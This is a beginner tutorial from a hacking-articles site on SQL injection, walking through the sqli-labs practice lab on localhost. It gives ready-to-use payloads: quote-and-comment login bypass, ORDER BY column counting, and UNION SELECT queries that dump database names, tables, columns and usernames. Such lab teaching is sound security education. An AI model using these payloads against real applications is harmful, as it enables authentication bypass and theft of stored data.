<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/database-hacking/" rel="category tag">Database Hacking</a>, <a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Beginner’s Guide to SQL Injection (Part 1)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/beginner-guide-sql-injection-part-1/" rel="bookmark"><time class="entry-date published" datetime="2017-05-28T16:52:43+00:00">May 28, 2017</time><time class="updated" datetime="2025-05-27T12:03:37+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">SQL injection is a technique where a malicious user can inject SQL Commands into an SQL statement via a web page.</span></p>
<p><span style="color: #000000;">An attacker could bypass authentication, access, modify and delete data within a database. In some cases, SQL Injection can even be used to execute commands on the operating system, potentially allowing an attacker to escalate to more damaging attacks inside of a network that sits behind a firewall.</span></p>
<h3><span style="color: #000000;">List of Database</span></h3>
<ul>
<li><span style="color: #000000;">MySQL(Open source),</span></li>
<li><span style="color: #000000;">MSSQL,</span></li>
<li><span style="color: #000000;">MS-ACCESS,</span></li>
<li><span style="color: #000000;">Oracle,</span></li>
<li><span style="color: #000000;">Postgre SQL(open source),</span></li>
<li><span style="color: #000000;">SQLite,</span></li>
</ul>
<h3><span style="color: #000000;">Type of SQL Injection</span></h3>
<ul>
<li><span style="color: #000000;">In Band</span></li>
<li><span style="color: #000000;">Out of Band</span></li>
<li><span style="color: #000000;">Blind SQLI</span></li>
</ul>
<h3><span style="color: #000000;">SQLI Exploitation Technique</span></h3>
<ul>
<li><span style="color: #000000;">Error Based Exploitation</span></li>
<li><span style="color: #000000;">Union Based Exploitation</span></li>
<li><span style="color: #000000;">Boolean Based Exploitation</span></li>
<li><span style="color: #000000;">Time-Based Delay Exploitation</span></li>
<li><span style="color: #000000;">Out of Band Exploitation</span></li>
</ul>
<p><span style="color: #000000;">Try to Identify- where the application interact with DB</span></p>
<ul>
<li><span style="color: #000000;">Authentication Page</span></li>
<li><span style="color: #000000;">Search Fields</span></li>
<li><span style="color: #000000;">Post Fields</span></li>
<li><span style="color: #000000;">Get Fields</span></li>
<li><span style="color: #000000;">HTTP Header</span></li>
<li><span style="color: #000000;">Cookie</span></li>
</ul>
<h3><span style="color: #000000;">Basic SQL Functions</span></h3>
<table>
<tbody>
<tr>
<td width="204"><span style="color: #000000;"><strong>SELECT</strong></span></td>
<td width="420"><span style="color: #000000;">read data from the database based on search criteria</span></td>
</tr>
<tr>
<td width="204"><span style="color: #000000;"><strong>INSERT</strong></span></td>
<td width="420"><span style="color: #000000;">insert new data into the database</span></td>
</tr>
<tr>
<td width="204"><span style="color: #000000;"><strong>UPDATE</strong></span></td>
<td width="420"><span style="color: #000000;">update existing data based on given criteria</span></td>
</tr>
<tr>
<td width="204"><span style="color: #000000;"><strong>DELETE</strong></span></td>
<td width="420"><span style="color: #000000;">delete existing data based on given criteria</span></td>
</tr>
<tr>
<td width="204"><span style="color: #000000;"><strong>Order By </strong></span></td>
<td width="420"><span style="color: #000000;">used to sort the result-set in ascending or descending order</span></td>
</tr>
<tr>
<td width="204"><span style="color: #000000;"><strong>Limit By</strong></span></td>
<td width="420"><span style="color: #000000;">the statement is used to retrieve records from one or more tables</span></td>
</tr>
</tbody>
</table>
<h3><span style="color: #000000;">SQL Injection Characters</span></h3>
<table>
<tbody>
<tr>
<td width="48"><span style="color: #000000;">1</span></td>
<td width="360"><span style="color: #000000;"> Character String Indicators</span></td>
<td width="216"><span style="color: #000000;"> ‘ or “</span></td>
</tr>
<tr>
<td width="48"><span style="color: #000000;">2</span></td>
<td width="360"><span style="color: #000000;"> Multiple-line comment</span></td>
<td width="216"><span style="color: #000000;">/*….*/</span></td>
</tr>
<tr>
<td width="48"><span style="color: #000000;">3</span></td>
<td width="360"><span style="color: #000000;"> Addition, concatenate ( or space   in URL)</span></td>
<td width="216"><span style="color: #000000;">+</span></td>
</tr>
<tr>
<td width="48"><span style="color: #000000;">4</span></td>
<td width="360"><span style="color: #000000;"> Single-line comment</span></td>
<td width="216"><span style="color: #000000;"># or – -(hyphen hyphen)</span></td>
</tr>
<tr>
<td width="48"><span style="color: #000000;">5</span></td>
<td width="360"><span style="color: #000000;"> Double pipe (concatenate)</span></td>
<td width="216"><span style="color: #000000;">||</span></td>
</tr>
<tr>
<td width="48"><span style="color: #000000;">6</span></td>
<td width="360"><span style="color: #000000;"> Wildcard attribute indicator</span></td>
<td width="216"><span style="color: #000000;"> %</span></td>
</tr>
<tr>
<td width="48"><span style="color: #000000;">7</span></td>
<td width="360"><span style="color: #000000;"> Local variable</span></td>
<td width="216"><span style="color: #000000;"> @variable</span></td>
</tr>
<tr>
<td width="48"><span style="color: #000000;">8</span></td>
<td width="360"><span style="color: #000000;"> Global variable</span></td>
<td width="216"><span style="color: #000000;"> @@variable</span></td>
</tr>
<tr>
<td width="48"><span style="color: #000000;">9</span></td>
<td width="360"><span style="color: #000000;"> Time delay</span></td>
<td width="216"><span style="color: #000000;"> waitfor delay ’00:00:10’</span></td>
</tr>
<tr>
<td width="48"><span style="color: #000000;">10</span></td>
<td width="360"><span style="color: #000000;">String instead of a number or vice versa</span></td>
<td width="216"/>
</tr>
</tbody>
</table>
<h3><span style="color: #000000;"> Database Fingerprinting</span></h3>
<p><span style="color: #000000;"><strong> </strong>We can find out the database by analyzing the error.</span></p>
<table>
<tbody>
<tr>
<td width="47"><span style="color: #000000;">S.no</span></td>
<td width="285"><span style="color: #000000;"> Error</span></td>
<td width="291"><span style="color: #000000;"> Type of Database</span></td>
</tr>
<tr>
<td width="47"><span style="color: #000000;"> 1</span></td>
<td width="285"><span style="color: #000000;">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ”1” LIMIT 0,1′ at line 1</span></td>
<td width="291"><span style="color: #000000;">             MySQL</span></td>
</tr>
<tr>
<td width="47"><span style="color: #000000;"> 2</span></td>
<td width="285"><span style="color: #000000;">ORA-00933: SQL command not properly ended</span></td>
<td width="291"><span style="color: #000000;">             Oracle</span></td>
</tr>
<tr>
<td width="47"><span style="color: #000000;"> 3</span></td>
<td width="285"><span style="color: #000000;">Microsoft SQL Native Client error ‘80040e14’ Unclosed quotation mark after the character string</span></td>
<td width="291"><span style="color: #000000;">             MS SQL</span></td>
</tr>
</tbody>
</table>
<h3><span style="color: #800000;">Understanding SQL Injection: The Basics</span></h3>
<p><span style="color: #000000;">First, download sqli lab from <a href="https://github.com/Audi-1/sqli-labs"><strong>here</strong> </a>and set up in xampp Open SQLI labs (https://github.com/Audi-1/sqli-labs)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-lWEKTjtHdKo/WSrzVWS5PXI/AAAAAAAAQE0/hPFRAwDklBYcHidQ5OpEC6TfNiOTdjDAQCLcB/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Click on Setup/reset Database for labs</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-5LnGBJ5PaOI/WSrzWedYpuI/AAAAAAAAQFA/BwVHfptA6IE70vGIOmYnYMpVFkx4aPeZwCEw/s1600/2.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-7-BeHXlcWGI/WSrzWm6zKzI/AAAAAAAAQFI/0_6jEPIzPGUi8ElwCnXqR1Izbvfc1ixvACEw/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Before jumping into Dhakkan lab</span></p>
<p><span style="color: #000000;">Let’s start by reviewing the fundamentals: How does the backend handle a query? How do you properly formulate questions? What causes them to break? And what exactly is SQL injection?</span></p>
<h4><span style="color: #800000;">What is SQL Injection?</span></h4>
<p><span style="color: #000000;">Consider a login page where you are requested to enter username and password when you enter username and password a query (SQL query) is generated at the backend which gets executed and the result is displayed to us on the home page after login.</span></p>
<p><span style="color: #000000;">Username – Raj</span></p>
<p><span style="color: #000000;">Password – Chandel</span></p>
<p><span style="color: #000000;">So backend query will look like</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">SELECT * FROM table_name WHERE username=’Raj’ AND password=’Chandel’;</pre>
<p><span style="color: #000000;">It is totally on the developer how he enclosed the parameter value in the SQL query, he can enclose the parameter value in a single quote, double quotes, double quotes with bracket etc.</span></p>
<p><span style="color: #000000;">So query may look like</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">SELECT * FROM table_name WHERE username='Raj' AND password='Chandel'; 
SELECT * FROM table_name WHERE username=(’Raj’) AND password=(’Chandel’);
SELECT * FROM table_name WHERE username="Raj" AND password="Chandel";
SELECT * FROM table_name WHERE username=("Raj") AND password=("Chandel");</pre>
<p><span style="color: #000000;">Or in any form totally developer’s choice.</span></p>
<p><span style="color: #000000;">I’ll explain further using the first query.</span></p>
<h4><span style="color: #800000;">How Malicious Input Breaks Queries</span></h4>
<p><span style="color: #000000;">Q – What if I enter username = Raj’?</span></p>
<p><span style="color: #000000;">Ans – If I enter username=Raj’ backend query will look like</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">SELECT * FROM table_name WHERE username=’Raj’’ AND password=’Chandel’;</pre>
<p><span style="color: #000000;">Which is syntactically wrong because of an extra quote</span></p>
<p><span style="color: #000000;">Q- How can we fix this broken query? Is it possible to do so?</span></p>
<p><span style="color: #000000;">Ans – Yes it is possible to fix above query even with username = Raj’</span></p>
<p><span style="color: #000000;">We can do so by commenting out the entire query after Raj’</span></p>
<p><span style="color: #000000;">So our valid query will be</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">SELECT * FROM table_name WHERE username=’Raj’</pre>
<p><span style="color: #000000;">Which is syntactically correct</span></p>
<h4><span style="color: #800000;">Bypassing Authentication Using Comments</span></h4>
<p><span style="color: #000000;">Q- How to comment out the remaining query?</span></p>
<p><span style="color: #000000;">Ans – Well it depends on the database that is there at the backend.</span></p>
<p><span style="color: #000000;">We generally use –+ (hyphen hyphen plus), # (hash)</span></p>
<p><span style="color: #000000;">So if I enter username = Raj’–+</span></p>
<p><span style="color: #000000;">The complete query at backend will look like</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">SELECT * FROM table_name WHERE username=’Raj’--+’ AND password=’Chandel’;</pre>
<p><span style="color: #000000;">But our database will read and execute only</span></p>
<p><span style="color: #000000;">SELECT * FROM table_name WHERE username=’Raj’   this much query because everything after –+ will be commented and will not be interpreted as part of the query.</span></p>
<p><span style="color: #000000;">This is what is called SQL INJECTION. Changing the backend query using malicious input.</span></p>
<p><span style="color: #000000;">I don’t know if you guys are having an interesting doubt or not but I had when I was learning all these stuff, and the doubt is</span></p>
<p><span style="color: #000000;">According to the above query formed by commenting, we don’t need a valid password to login?</span></p>
<p><span style="color: #000000;">Yes if the developer had not taken measure to prevent SQL injection and implemented the query as shown above it is possible to login using the only username.</span></p>
<p><span style="color: #000000;">Confused? Don’t be. I’ll show you this in my upcoming articles. Now you are ready for the lab, so let’s start.</span></p>
<h3><span style="color: #800000;">Breaking the Query: Error-Based SQL Injection</span></h3>
<p><span style="color: #000000;">Click on lesson 1 and add id as a parameter in the URL</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-OiJ72FLH1t4/WSrzWkPt2pI/AAAAAAAAQFE/G-bIOM67GKgzjt2VENZcFDJJSfafn4_RACEw/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Keep on increasing id value (id=1, id=2…and so on) you will notice you will get an empty screen with no username and password after id=14 which means the database has 14 records.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-BFz-jCyMdq4/WSrzXZxXCbI/AAAAAAAAQFM/Jf8uxwq1wo88K0i2T45nkwT8yNqaGhjkACEw/s1600/5.jpg"/></span></p>
<p><span style="color: #000000;">So backend query must be something like this</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">SELECT * from table_name WHERE id='1';
                                Or
SELECT * from table_name WHERE id=('1');
                                Or
SELECT * from table_name WHERE id="1";</pre>
<p><span style="color: #000000;">At this point, we don’t know how the developer enclosed the value of the id parameter. Let’s find out</span></p>
<p><span style="color: #000000;">Break the query by fuzzing, enter id=1’</span></p>
<p><span style="color: #000000;">Boom!! We get the SQL Syntax error. Since this error will help us in finding the back end query and we will do SQL injection using this error, this type of SQL Injection is called <strong>Error Based SQL Injection</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-pA78C_Ghb0M/WSr-HPbTm1I/AAAAAAAAQGk/UKOUxTGZtZgENJZ8UVaFQc0hkoyCJHyUQCLcB/s1600/5.4.png"/></p>
<p><span style="color: #000000;">Now we have to analyze the error See screenshot</span></p>
<p> </p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wMdl299NdmY/WSrzYYdk6lI/AAAAAAAAQFk/0HIWuh2XrjkiTGdx33IpZX_LcszBmPoKwCEw/s1600/7.jpg"/></span></p>
<p><span style="color: #000000;">You can also find out this using escape character, in MySQL \ (backslash) is used to escape a character.</span></p>
<p><span style="color: #000000;">Escaping a character means to nullify the special purpose of that character. You will get a clearer picture using the escape character</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ZgYVNd-0pVE/WSrzYD7-V5I/AAAAAAAAQFk/iZ40XWkvvLYq7BRKLf27LO0TU1v6gNvcACEw/s1600/8.jpg"/></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Fxr99-FGGPI/WSr-ZAzY5FI/AAAAAAAAQGo/N7k2HKL9JmIeTNiHxZMmDQ-nHLschDH5ACLcB/s1600/5.7.jpg"/></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PGFQV-YnZYI/WSrzVjFCkgI/AAAAAAAAQFk/3lnWP0M5t3swzzGvwm_xW7GUIFu2VdZZQCEw/s1600/10.jpg"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yzxbRg69iSk/WSrzV45j_wI/AAAAAAAAQFk/Oy188g4_-J4fcaAx83HMOAFJQGh9v-eVgCEw/s1600/11.jpg"/></span></p>
<p><span style="color: #000000;">It is clear from the above screenshots that backend query</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Less-1       -        SELECT * from table_name WHERE id=’our input’
Less-2       -        SELECT * from table_name WHERE id=our input
Less-3       -        SELECT * from table_name WHERE id=(’our input’)
Less-4       -        SELECT * from table_name WHERE id=(“our input”)</pre>
<p><span style="color: #000000;">From now I’ll take Less-1 as a base lesson to explain further</span></p>
<p><span style="color: #000000;">With our input as 1’ complete backend query will be</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">SELECT * from table_name WHERE id=’1’’ LIMIT 0,1</pre>
<p><span style="color: #000000;">Which is syntactically incorrect and I explained above how to make is syntactically correct</span></p>
<p><span style="color: #000000;">By giving input 1’–+ (1 quote hyphen hyphen plus)</span></p>
<p><span style="color: #000000;">Or By giving input 1’–%20 (%20 URL encoding for space)</span></p>
<p><span style="color: #000000;">Or By giving input 1’%23 (%23 URL encoding for #)</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost/sqli/Less-1/?id=1' --%20</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-83x1hxRKIv0/WSr0bHu38TI/AAAAAAAAQFo/T1xQLx64i7ILu-U-MKOzDDM60pqBAmP9gCLcB/s1600/12.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost/sqli/Less-1/?id=1' %23</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-_zWvznYalCk/WSr0bcoJgaI/AAAAAAAAQFw/gPmnXJSE-jw9rHxvnIpzZoTjKD34vFIfACEw/s1600/13.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost/sqli/Less-1/?id=1' --+</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ji7MjmAlUKM/WSr0bLBcYJI/AAAAAAAAQFs/lJZOSfEgx-AADyKuxMoFxYVV9mBfaG2twCEw/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Now we are able to break the query and are able to fix it syntactically.</span></p>
<p><strong><span style="color: #000000;"> What Next?</span></strong></p>
<h3><span style="color: #800000;">Union-Based SQL Injection: Extracting Data</span></h3>
<p><span style="color: #000000;">Now we will try to add query between the quote and –+ to get information from the database</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-zVZrbIeQ6Fo/WSr0bhe29II/AAAAAAAAQF0/ugrhbG6amiU79SqAE1JalhoXMaz9cbzZQCEw/s1600/15.jpg"/></span></p>
<p><span style="color: #000000;">We’ll use another SELECT query here to get information from the database.</span></p>
<p><span style="color: #000000;">Q – Will two SELECT queries work together?</span></p>
<p><span style="color: #000000;">ANS – NO, we have to use the UNION operator to make it work.</span></p>
<p><span style="color: #000000;">The UNION operator is used to combine the result-set of two or more SELECT statements.</span></p>
<p><span style="color: #000000;">But for UNION operator there is one precondition that Number of columns on both sides of the UNION operator should be same.</span></p>
<h4><span style="color: #800000;">Finding the Number of Columns</span></h4>
<p><span style="color: #000000;">Since we don’t know the number of columns in the SELECT query at the backend so first, we have to find the number of columns used in the SELECT query.</span></p>
<p><span style="color: #000000;">For this, we will use ORDER BY clause.</span></p>
<p><span style="color: #000000;">ORDER BY clause will arrange the result set in ascending or descending order of the columns used in the query.</span></p>
<p><span style="color: #000000;">ORDER BY country     à  will arrange the result set in asc order of elements of the column (country)</span></p>
<p><span style="color: #000000;">Now the problem is we even don’t know the names of the column…</span></p>
<p><span style="color: #000000;">Solution to this problem is in ORDER BY clause…</span></p>
<p><span style="color: #000000;">We’ll use ORDER BY 1, ORDER BY 2 etc. because ORDER BY 1 will arrange the result set in ascending order of the column present at first place in the query. (Please note, ORDER BY 1 will not arrange the result set according to the first column of the table, it will arrange the result set in ascending order of the column present at first place in the query).</span></p>
<p><span style="color: #000000;">Let’s try now</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost/sqli/Less-1/?id=1' order by 1 --+    No Error</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-ZVcWZIOiPbM/WSr-wU0mcPI/AAAAAAAAQGs/61f5v7xuDIwhisRIKjOA-bz4VHD1O6VDQCLcB/s1600/9.png"/></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost/sqli/Less-1/?id=1' order by 2 --+    No Error</pre>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-LUWrlzGN5Zg/WSr0cOF5Y9I/AAAAAAAAQGA/I67zoZA5H3kjqRtkxmI1J6O0SSklnq6uACEw/s1600/17.png" alt="SQL injection for beginners" width="906" height="326"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost/sqli/Less-1/?id=1' order by 4 --+    Error</pre>
<p><span style="color: #000000;">This shows that there is no 4<sup>th</sup> column in the query. So now we know there are 3 columns in the query at the backend.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-TvDhjgjvq1Q/WSr0cewJkTI/AAAAAAAAQGE/QhvRHUFNWAISVQb4sndpV-jTEoa1urAOACEw/s1600/18.png"/></span></p>
<h4><span style="color: #800000;">Using UNION to Extract Database Info</span></h4>
<p><span style="color: #000000;">So now we can use the UNION operator with another SELECT query.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost/sqli/Less-1/?id=1' union select 1,2,3 --+</pre>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-5ByFivGZwxc/WSr0czpujBI/AAAAAAAAQGY/cKGDyB7o1asCJyYQMGPQXbEKLbRAfwWkACEw/s1600/19.png" alt="SQL injection for beginners" width="865" height="337"/></span></p>
<p><span style="color: #000000;">See there is no error but we are getting result set of the first query, to get the result of a second select query on the screen we have to make the result set of the first query as EMPTY. This we can achieve by providing the id that does not exist. We can provide negative id or id &gt;14 because in the starting of the article we figured out that there are 14 ids in the database.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost/sqli/Less-1/?id=-1' union select 1,2,3 --+
Or
http://localhost/sqli/Less-1/?id=15' union select 1,2,3 --+</pre>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://2.bp.blogspot.com/-POQqnGmylpI/WSr0c_Q3d_I/AAAAAAAAQGY/3riGpluMicwo_M3AIoEjobqdrD1L-KicgCEw/s1600/20.png" alt="SQL injection for beginners" width="861" height="335"/></span></p>
<p><span style="color: #000000;">This shows we are getting values of column 2 and column 3 as output. So we’ll use these two columns to extract information about the database and from the database.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost/sqli/Less-1/?id=-1' union select 1,2,version() --+</pre>
<p><span style="color: #000000;">This will give the version of the database used at the backend</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-33ft3yDCJMI/WSr0c4R1ZGI/AAAAAAAAQGY/7-W4UMJf1YYCmebW1VUwPhtidathFFw4gCEw/s1600/21.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost/sqli/Less-1/?id=-1' union select 1,database(),version() --+</pre>
<p><span style="color: #000000;">This will give the database we are using and the current version of the database used at the backend</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://2.bp.blogspot.com/-DqBGm2i3kAU/WSr0doPmJ5I/AAAAAAAAQGY/J5_cJYB9NfMucUZlW3KbknCwWD28ypafwCEw/s1600/22.png" alt="SQL injection for beginners" width="903" height="353"/></span></p>
<p><span style="color: #000000;">Since we are using UNION operator to perform SQL INJECTION, this type of injection is called UNION BASED SQL INJECTION ( a type of ERROR BASED SQL INJECTION)</span></p>
<p><span style="color: #000000;"><strong> </strong></span><span style="color: #000000;"><strong>Union Based SQL Injection</strong></span></p>
<table>
<tbody>
<tr>
<td width="246"><span style="color: #000000;"><strong>Variable/function</strong></span></td>
<td width="354"><span style="color: #000000;"><strong>Output</strong></span></td>
</tr>
<tr>
<td width="246"><span style="color: #000000;"><strong>user()</strong></span></td>
<td width="354"><span style="color: #000000;"><strong>Current User</strong></span></td>
</tr>
<tr>
<td width="246"><span style="color: #000000;"><strong>database()</strong></span></td>
<td width="354"><span style="color: #000000;"><strong>Current Database</strong></span></td>
</tr>
<tr>
<td width="246"><span style="color: #000000;"><strong>version()</strong></span></td>
<td width="354"><span style="color: #000000;"><strong>Database Version</strong></span></td>
</tr>
<tr>
<td width="246"><span style="color: #000000;"><strong>schema()</strong></span></td>
<td width="354"><span style="color: #000000;"><strong>Current Database</strong></span></td>
</tr>
<tr>
<td width="246"><span style="color: #000000;"><strong>UUID()</strong></span></td>
<td width="354"><span style="color: #000000;"><strong>System UUID Key</strong></span></td>
</tr>
<tr>
<td width="246"><span style="color: #000000;"><strong>current_user()</strong></span></td>
<td width="354"><span style="color: #000000;"><strong>Current User</strong></span></td>
</tr>
<tr>
<td width="246"><span style="color: #000000;"><strong>system_user()</strong></span></td>
<td width="354"><span style="color: #000000;"><strong>Current System User</strong></span></td>
</tr>
<tr>
<td width="246"><span style="color: #000000;"><strong>session_user()</strong></span></td>
<td width="354"><span style="color: #000000;"><strong>Session User</strong></span></td>
</tr>
<tr>
<td width="246"><span style="color: #000000;"><strong>@@hostname</strong></span></td>
<td width="354"><span style="color: #000000;"><strong>Current Hostname</strong></span></td>
</tr>
<tr>
<td width="246"><span style="color: #000000;"><strong>@@tmpdir</strong></span></td>
<td width="354"><span style="color: #000000;"><strong>Temporary Directory</strong></span></td>
</tr>
<tr>
<td width="246"><span style="color: #000000;"><strong>@@datadir</strong></span></td>
<td width="354"><span style="color: #000000;"><strong>Data Directory</strong></span></td>
</tr>
<tr>
<td width="246"><span style="color: #000000;"><strong>@@version</strong></span></td>
<td width="354"><span style="color: #000000;"><strong>Version of Database</strong></span></td>
</tr>
<tr>
<td width="246"><span style="color: #000000;"><strong>@@basedir</strong></span></td>
<td width="354"><span style="color: #000000;"><strong>Base Directory</strong></span></td>
</tr>
<tr>
<td width="246"><span style="color: #000000;"><strong>@@GLOBAL.have_symlink</strong></span></td>
<td width="354"><span style="color: #000000;"><strong>Check if the symlink is Enabled or Disabled</strong></span></td>
</tr>
<tr>
<td width="246"><span style="color: #000000;"><strong>@@GLOBAL.have_ssl</strong></span></td>
<td width="354"><span style="color: #000000;"><strong>Check if it SSL is available</strong></span></td>
</tr>
</tbody>
</table>
<h4><span style="color: #800000;">Extracting Table Names, Columns &amp; Data</span></h4>
<p><span style="color: #000000;">In order for union injections to work, we should first know the name of tables in the database and for this type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() --+</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-uAyhU1B55PY/WVpw101k9_I/AAAAAAAAQXU/mdoTUXuOtH4pAXGPel1rxpg7D9H5_IDWwCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">As you know see that the above query will show us the name of one of the tables in the database. For instance: <strong>emails</strong></span></p>
<p><span style="color: #000000;">Now, sometimes programmer may not print all the rows so we will have to check these rows of database one by one using <strong>the limit keyword</strong>. Therefore, type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1 --+</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-z8xAMT0hHkc/WVpw15IwoaI/AAAAAAAAQXY/Kkh1_HdYUPk31pJY0n6JMoXBSOjCrNgWQCLcBGAs/s1600/2.png" alt="SQL injection for beginners" width="740" height="205"/></span></p>
<p><span style="color: #000000;">As you can see that the second table in the database is <strong>referers</strong>.</span></p>
<p><span style="color: #000000;">Similarly, let’s check the next table name.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 2,1 --+</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qfrB98MD2io/WVpw13qcoqI/AAAAAAAAQXc/TwWMYeh6E1s2xdx7JHDGWFsR2NgHq8NugCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">This was one method to check table names, one by one, another method is getting all the table names once and together by using group concat keyword. This keyword presents all the table name as group. For this type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://4.bp.blogspot.com/-WELEot9bWBI/WVpw2ZrYTLI/AAAAAAAAQXo/-NsqzN1Zhdkt0CR6Hskbg1Uj7Qi4Fa8-QCEwYBhgL/s1600/4.png" alt="SQL injection for beginners" width="831" height="210"/></span></p>
<p><span style="color: #000000;">And as a result, which you can observe in the above image, all the table names will be shown together.</span></p>
<h4><span style="color: #800000;">Exploring Table Columns Using group_concat</span></h4>
<p><span style="color: #000000;">Now let’s check one of the tables presented to us. To extract information from a tables type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://4.bp.blogspot.com/-uh5NKfqhSOU/WVpw2cx7g6I/AAAAAAAAQXg/y9CXz6Px06kU_dDzBFlqzEDoumBu5dVNACEwYBhgL/s1600/5.png" alt="SQL injection for beginners" width="848" height="267"/></span></p>
<p><span style="color: #000000;">As you can see the above statement shows all the columns together due to the use of <strong>the group_concat</strong> keyword. Also, we are using the word ‘column’ instead of ‘table’ because we want to know the column of a table now.</span></p>
<p><span style="color: #000000;">Till now we have extracted different names of databases and its tables. Now let’s see the content of a table. For this type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">id=-1' union select 1,group_concat(username),3 from users --+</pre>
